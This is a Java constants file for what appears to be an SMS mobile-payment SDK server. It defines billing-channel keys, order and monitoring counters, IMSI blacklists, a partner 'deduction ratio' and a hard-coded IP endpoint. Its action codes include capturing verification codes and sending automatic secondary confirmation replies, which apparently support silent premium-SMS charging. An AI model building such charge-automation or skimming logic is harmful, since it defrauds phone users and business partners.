package com.codebuilding;

import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class Constant {
	public static  Integer[] PRICES = { 1, 2, 4, 5, 6, 8, 10, 12, 15, 20 };

	public static final String SDK_APPID = "sdk-appid-";
	public static final String DEDUCTION_RATIO = "deduction-ratio-";
	public static final String SPINFO_RATIO = "spinfo-ratio-";//sp-扣量比例
	public static final String SP_RATIO = "sp-ratio-";//结算比例
	public static final String USERIDURLDAYLIMIT = "useridurldaylimit-";//用户每条通道日限
	public static final int FIVE_DAY_SECOND = 432000;//5天 -秒

	public static final String DAYLIMITURL = "DayLimitUrl";
	public static final String TIMELIMITURL = "TimeLimitUrl";
	public static final String ORDERIDSTATE = "orderidstate-";
	public static final String BEFORE_REGISTER = "beforegister";

	public static final String REGISTER = "register";
	public static final String AFTER_REGISTER = "afterregister";
	public static final String BEFORE_PAY = "beforepay";
	public static final String AFTER_PAY = "afterpay";
	public static final String IN_PAY = "inpay";
	public static final String EXCEPTION = "exception";
	public static ExecutorService cachedThreadPool = Executors
			.newCachedThreadPool();

	public static final String USER_NOT_EXIST = "40001"; /* 用户不存在 */
	public static final String IMSI_NOT_EXIST = "40002"; /* IMSI不存在 */
	public static final String NO_SP = "40003";
	public static final String GET_CMD_FAIL = "40004";
	public static final String GET_TIME_OUT = "timeout";
	public static final String NO_RESULT = "40005";

//	public static final String REQ_NUM = "reqnum-";

	public static final String TEL_TYPE_FORMPHONE = "1";
	public static final String TEL_TYPE_4GWEB = "2";
	public static final String TEL_TYPE_QXTAPI = "3";
	public static final String TEL_TYPE_QXTMESS = "4";
	public static final String TEL_TYPE_QXTMESS_SUC = "5";

	public static final int Tel_Time = 60 * 60;
	public static final int QXT_Time = 60 * 60 * 24;

	/*
	 * 1.直接发送短信 发送短信成功0 发送短信失败12.短信用二进制发送 发送短信成功0 发送短信失败13.短信base64解码之后发送
	 * 发送短信成功0 发送短信失败14.短信base64解码之后二进制发送 发送短信成功0 发送短信失败15.获取验证码 获取验证码成功0
	 * 获取验证码失败16.携带验证码访问url 访问url成功0 访问url失败17.携带验证码进行二次回复 二次回复失败1 二次回复成功0
	 * 8.直接访问url 访问url成功0 访问url失败1
	 */

	public static final String SEND_MESS = "1";
	public static final String SEND_MESS_BINARY = "2";
	public static final String SEND_MESS_BASE64 = "3";
	public static final String SEND_MESS_BASE64_BINARY = "4";
	public static final String REPLY = "5";
	public static final String REPLY_TO_URL = "6";
	public static final String REPLY_TO_UP = "7";
	public static final String TO_URL = "8";

	public static final String CODE_FIAL = "1";
	public static final String CODE_SUC = "0";

	public static final String GET_URL_SUC = "0";
	public static final String GET_URL_FAIL = "1";

	public static final String OPEN_AT_INIT = "0";
	public static final String OPEN_AT_PAY = "1";
	public static final String OPEN_AT_NULL = "2";

	public static final String IN_USE = "1";
	public static final String UN_USE = "0";

	public static final String SP_INTERVAL_TIME = "reqtime-";
	public static final String SP_DAY_LIMIT = "daylimit-";
	public static final String SP_FROM_TIME = "spfromtime-";
	public static final String SP_TO_TIME = "sptotime-";
	public static final String GTW = "gtw-";
	public static final String GTW_VICE = "gtw-vice-";//附属通道
	public static final String GTW_IN_100 = "gtwin100-";
	public static final String GTW_OUT_100 = "gtwout100-";
	public static final String GTW_TEMPORARY = "gtw-temporary-";//临时通道
	public static final String APP_OWNER_SP = "appownersp-";
	public static final String APP_PB_SP = "apppbsp-";
	public static final String TIME_LIMIT = "timelimit-";
	public static final String TEL_TYPE = "teltype-";
	public static final String WEBORDER = "weborder-";
	public static final String QXT_USE = "qxtuse-";
	public static final String MOBILE = "mobile-";
	public static final String MONITOR_REQ_GTW_SUC = "reqGTWsucnum-";//carrier-price-pro 通道请求成功数
	public static final String MONITOR_REQ_SUC = "reqsucnum-";//gtwno-pro请求成功数
	public static final String MONITOR_REQ = "reqnum-";//gtwno请求数，目前未用到
	public static final String MONITOR_REQ_ARPU = "req-arpu-";// gtwno-pro请求arpu
	public static final String MONITOR_SUC_PRICE = "sucnum-";//通道总金额  gtwno-pro
	public static final String MONITOR_ALL_SUC_PRICE = "allsucnum-";//fm总金额
	public static final String ORDERNO_PRICE = "ordernoprice-";
	public static final String ORDERNO_DISTRO = "ordernodistro-";
	public static final String ORDERNO_FM = "ordernofm-";
	public static final String ORDERNO_FROM = "ordernofrom-";
	public static final String ORDERNO_PRO = "ordernopro-";
	public static final String ORDERNO_APPID = "ordernoappid-";
	public static final String ORDERNO_USERID = "ordernouserid-";
	public static final String SP_CRRIER = "spcarrier-";
	public static final String SP_URLS = "urls";
	public static final String SP_URLS_OTHER = "urlsother";
	public static final String fm_ORDER_NO = "urlorderno-";
	public static final String fm_ORDER_CRRIER = "urlordercarrier-";
	public static final String fm_ORDER_URL = "urlorderurl-";
	public static final String fm_ORDER_PRICE = "urlorderprice-";
	public static final String SP_REQ_TYPE = "reqtype-";
	public static final String SP_URL = "spurl-";
	public static final int ORDER_NUM = 100;

	public static final String APP_PIBI_POOL = "pibipool-";
	public static final String APP_OWNER_POOL = "ownerpool-";

	public static final String SP_BACK_CMD_LIST = "spBackCmdList-";
	public static final String SP_RESULT = "spresult";
	public static final String SP_RESULT_VALUE = "spresultvalue";
	public static final String SP_PARAM = "spparam-";
	public static final String SP_DOTYPE = "spdotype-";
	public static final String SP_DOTYPE_SIYOU = "0";
	public static final String SP_DOTYPE_TONGYONG = "1";
	public static final String RE_URL = "http://121.41.7.235:9999/SdkServer/recmd/get";

	public static final String PRO_OPEN = "1";
	public static final String PRO_CLOSE = "0";
	public static final String BLACK_TELS = "black_tels";
	public static final String BLACK_IMSI = "black_imsi";
	public static final Integer SUMCOUNT_FACTOR = 25;

}
